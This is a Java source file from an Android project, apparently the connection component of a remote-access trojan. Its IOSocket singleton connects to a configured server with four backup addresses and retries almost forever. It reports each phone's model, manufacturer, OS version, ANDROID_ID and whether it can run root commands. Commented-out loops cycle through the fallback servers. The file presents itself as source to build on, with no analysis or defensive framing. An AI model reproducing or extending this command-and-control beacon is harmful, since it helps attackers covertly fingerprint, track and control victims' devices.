package com.remote.app;

import android.app.admin.DeviceAdminService;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;


    private IOSocket() {
        try {
            String[] ips = new String[]{config.ip,config.ip_rezerv,config.ip_rezerv_2,config.ip_rezerv_3,config.ip_rezerv_4};

            final String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;

            ioSocket = IO.socket(ips[0]+"?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID+"&root="+ExecuteAsRootBase.canRunRootCommands());


            /*Integer i =1;

            while(!ioSocket.connected()){
                Log.d("MYLOGS", String.valueOf(ioSocket.connected()));
                if(i==6)
                    break;
                ioSocket = IO.socket(ips[i]+"?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
                i++;
            }*/



             /*if(!ioSocket.connected()){
                 for(int i =0; i < 6;i++){
                     if(!ioSocket.connected()){
                         ioSocket = IO.socket(ips[i]+"?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
                     }else{
                         break;
                     }
                 }

             }*/
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }catch (Exception e){}
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }

}
